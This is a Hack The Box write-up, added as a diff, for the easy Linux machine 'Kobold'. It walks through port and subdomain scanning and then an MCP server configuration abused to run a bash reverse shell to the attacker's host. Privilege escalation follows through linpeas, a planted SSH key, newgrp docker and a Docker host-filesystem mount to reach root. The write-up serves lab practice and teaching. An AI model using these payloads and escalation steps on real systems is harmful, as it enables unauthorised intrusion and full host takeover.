@@ -1,0 +1,238 @@
+---
+title: Kobold
+date: '2026-03-28'
+description: "HTB machine Season 10"
+type: writeup
+platform: hackthebox
+tags:
+  - ACTIVE MACHINE
+  - HTB
+  - LINUX
+  - EASY
+cover: /mc/images/mcp_rce.png
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+In this write-up, we will walk through the steps to hack the Kobold machine on Hack The Box. Let's dive in!
+
+## Recon
+
+We are going to use Nmap to scan the ports.
+
+```bash
+$ nmap -sC -sV  10.129.13.187   
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-28 08:43 -0400
+Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 83.33% done; ETC: 08:43 (0:00:00 remaining)
+Nmap scan report for kobold.htb (10.129.13.187)
+Host is up (0.21s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
+|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
+80/tcp  open  http     nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://kobold.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   http/1.1
+|   http/1.0
+|_  http/0.9
+|_http-title: Kobold Operations Suite
+| ssl-cert: Subject: commonName=kobold.htb
+| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
+| Not valid before: 2026-03-15T15:08:55
+|_Not valid after:  2125-02-19T15:08:55
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+As we can see, ports 80 and 443 are open. After interacting with the website, I only found a static page and nothing very interesting. While doing directory fuzzing, I also did some subdomain fuzzing and found this:
+
+```bash
+ffuf -u https://10.129.XXX.XXX -H "Host: FUZZ.kobold.htb" -w /usr/share/wordlists/dnsmap.txt -fs 154 -k 
+________________________________________________
+
+bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 282ms]
+mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 225ms]
+:: Progress: [17576/17576] :: Job [1/1] :: 191 req/sec :: Duration: [0:01:33] :: Errors: 0 ::
+```
+
+(I only found this after adding `https` and `-k`. Without them, I did not get anything.)
+
+After directory fuzzing, I found nothing useful. But I was pretty sure the path to RCE had to be through `mcp`, so I spent more time interacting with the subdomain `mcp.kobold.htb`.
+
+## Initial access
+
+After a while in Burp Suite, I found this:
+
+[![mcp subdomain](/mdx_images/kobold/mcp-subdomain.png)](/mdx_images/kobold/mcp-subdomain.png)
+
+As you can see, we can create our own MCP configuration. That immediately made me think: what if we change those values and create a malicious MCP that gives us RCE?
+
+By changing the JSON and using the payload below, I successfully got RCE on the machine as `ben`:
+
+```json
+{
+  "serverConfig": {
+    "command": "bash",
+    "args": ["-c", "bash -i >& /dev/tcp/<your-ip>/1234 0>&1"],
+    "env": {}
+  },
+  "serverId": "test"
+}
+```
+Then I set up a listener with `nc`:
+
+```bash
+nc -lvnp 1234 
+listening on [any] 1234 ...
+connect to [10.10.14.151] from (UNKNOWN) [10.129.13.187] 42814
+bash: cannot set terminal process group (1528): Inappropriate ioctl for device
+bash: no job control in this shell
+ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ id
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+```
+
+At this point, you can go to Ben's home directory and read the user flag.
+
+## PrivEsc
+
+For privilege escalation, I used `linpeas`, so the next step was to upload it.
+
+```bash
+attacker side (linpeas.sh directory)
+python3 -m http.server 80
+target side 
+ben@kobold:~$ wget your-ip/linpeas.sh
+HTTP request sent, awaiting response... 200 OK
+Length: 1005683 (982K) [application/x-sh]
+'linpeas.sh' saved [1005683/1005683]
+ben@kobold:~$ bash linpeas.sh
+```
+
+Before digging into the output of `linpeas.sh`, I created my own SSH key so I could get a more stable connection.
+
+To do that, we can create a new SSH key or use an existing one.
+
+```bash
+attacker side 
+kali@kali:$ ssh-keygen -f kobold -C "WAS@HERE"
+target side: 
+ben@kobold:~$ mkdir .ssh
+mkdir .ssh
+ben@kobold:~$ echo 'ssh-ed25519 AAAAA(kobold.pub content)'>.ssh/authorized_keys
+
+to attacker machine :
+
+ssh ben@kobold.htb -i ~/Desktop/kobold
+ben@kobold:~$ 
+```
+
+After injecting the SSH key into the target machine, I went back to the output of `linpeas.sh`.
+
+```bash
+
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 200) (T1574.009,T1574.010)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                     
+  Group operator:                                                                                                                                    
+/privatebin-data                                                                                                                                     
+/privatebin-data/certs
+/privatebin-data/certs/key.pem
+/privatebin-data/certs/cert.pem
+/privatebin-data/data
+/privatebin-data/data/purge_limiter.php
+/privatebin-data/data/bd
+/privatebin-data/data/bd/b5
+/privatebin-data/data/.htaccess
+/privatebin-data/data/salt.php
+
+
+╔══════════╣ Unix Sockets Analysis (T1571,T1049)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                            
+/run/containerd/containerd.sock                                                                                                                      
+/run/containerd/containerd.sock.ttrpc
+/run/dbus/system_bus_socket
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+/run/docker.sock
+/run/lxd-installer.socket
+/run/php/php8.3-fpm.sock
+/run/snapd-snap.socket
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+...
+```
+
+The important thing here is `/run/docker.sock`, because if we can use it, we can mount the entire host filesystem into a container.
+
+For more information, you can check the HackTricks page explaining Docker Unix sockets.
+
+The problem is that we are not in the `docker` group, so we need to figure out how to get access to it.
+
+```bash
+ben@kobold:~$ id
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+ben@kobold:~$grep -r 'docker' /etc/group
+docker:x:111:alice
+```
+
+So `alice` is the only one in that group. I tried to find a path involving Alice or something inside PrivateBin, but I did not find anything useful there. Maybe there is a cleaner intended path and I just did not dig far enough.
+
+What I *did* try was `newgrp docker`, hoping it would work without prompting for a password.
+
+<p align="center">
+  <a href="/mdx_images/kobold/man-crying-stan-twt.gif">
+    <img src="/mdx_images/kobold/man-crying-stan-twt.gif" alt="man crying stan" width="340" />
+  </a>
+</p>
+
+```bash
+ben@kobold:~$ newgrp docker
+ben@kobold:~$ id
+uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
+```
+
+And somehow, it worked.
+
+<p align="center">
+  <a href="/mdx_images/kobold/happy-happy-happy.gif">
+    <img src="/mdx_images/kobold/happy-happy-happy.gif" alt="happy happy happy" width="520" />
+  </a>
+</p>
+
+Now that we have Docker access, we can check what images are available to use.
+
+```bash
+ben@kobold:~$ docker images
+REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
+mysql                         latest    f66b7a288113   7 weeks ago    922MB
+privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   5 months ago   122MB
+```
+
+So we have `privatebin/nginx-fpm-alpine`, which is enough for the final step.
+
+The last thing we need to do is create a container, mount the host filesystem, and chroot into it:
+
+```bash
+ben@kobold:~$ docker run --rm -it --privileged -u 0 --entrypoint sh -v /:/host privatebin/nginx-fpm-alpine:2.0.2 -c 'chroot /host /bin/bash'
+groups: cannot find name for group ID 11
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+root@697135f2885f:/# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+root@697135f2885f:/#
+```
+
+And that gives us root.
+
+We got the root shell, but I still feel like I missed part of the story. I am not fully convinced that Alice and PrivateBin are there for no reason. Maybe there is some intended logic behind them, and I just did not find it.
+
+Still, what matters is that the box is rooted.
